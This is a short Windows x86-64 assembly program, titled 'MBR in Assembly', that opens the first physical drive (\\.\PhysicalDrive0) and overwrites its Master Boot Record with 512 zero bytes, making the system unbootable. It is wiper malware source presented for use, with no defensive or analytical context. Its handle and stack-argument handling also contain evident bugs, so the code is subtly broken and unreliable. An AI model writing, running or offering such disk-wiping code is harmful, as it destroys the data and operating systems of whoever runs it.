// MBR in Assembly.

section .data
    ; Master Boot Record (512 bytes of zeros)
    MasterBootRecord times 512 db 0

    ; Device path string
    devicePath db "\\.\PhysicalDrive0", 0

section .text
    global mbr
    extern CreateFileA, WriteFile, CloseHandle, GetLastError

mbr:
    ; Function prologue
    push rbp
    mov rbp, rsp
    sub rsp, 48                 ; Shadow space + local variables

    ; CreateFileA call
    lea rcx, [devicePath]       ; lpFileName
    mov edx, 10000000h          ; GENERIC_ALL
    mov r8d, 3                  ; FILE_SHARE_READ | FILE_SHARE_WRITE
    xor r9d, r9d                ; lpSecurityAttributes = NULL
    mov dword [rsp+32], 3       ; OPEN_EXISTING
    mov dword [rsp+40], 0       ; dwFlagsAndAttributes = 0
    mov qword [rsp+48], 0       ; hTemplateFile = NULL
    call CreateFileA

    ; Check if handle is valid
    cmp rax, -1                 ; INVALID_HANDLE_VALUE
    je .cleanup

    mov rcx, rax                ; hFile
    lea rdx, [MasterBootRecord] ; lpBuffer
    mov r8d, 512                ; nNumberOfBytesToWrite
    lea r9, [rsp+28]            ; lpNumberOfBytesWritten
    mov qword [rsp+32], 0       ; lpOverlapped = NULL
    call WriteFile

    ; Close handle
    mov rcx, [rbp-8]            ; hFile
    call CloseHandle

.cleanup:
    ; Function epilogue
    xor eax, eax                ; return 0
    mov rsp, rbp
    pop rbp
    ret